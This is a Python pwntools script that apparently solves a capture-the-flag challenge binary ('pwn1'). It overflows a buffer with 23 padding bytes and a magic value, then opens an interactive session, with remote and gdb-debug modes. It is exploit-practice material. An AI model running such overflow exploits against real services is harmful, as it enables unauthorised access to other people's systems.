#!/usr/bin/env python
from pwn import *
import sys

context.terminal = ['tmux','splitw','-h']

def exploit(r):

    r.send("A"*23)
    r.sendline(p32(0xf007ba11))
    r.interactive()
    return





if __name__ == "__main__":
    log.info("For remote %s HOST PORT" % sys.argv[0])
    if len(sys.argv) > 1:
        r = remote(sys.argv[1], int(sys.argv[2]))
        exploit(r)
    else:
        r = process('./pwn1')     #put binary here
        print util.proc.pidof(r)
        gdb_cmd = [
            "b *0x804861d",
            "c"


        ]
        gdb.attach(r, gdbscript = "\n".join(gdb_cmd))
        #r = process("./LOLgame", env={"LD_PRELOAD" : "./libc.so.6.remote"})
        #pause()
        exploit(r)










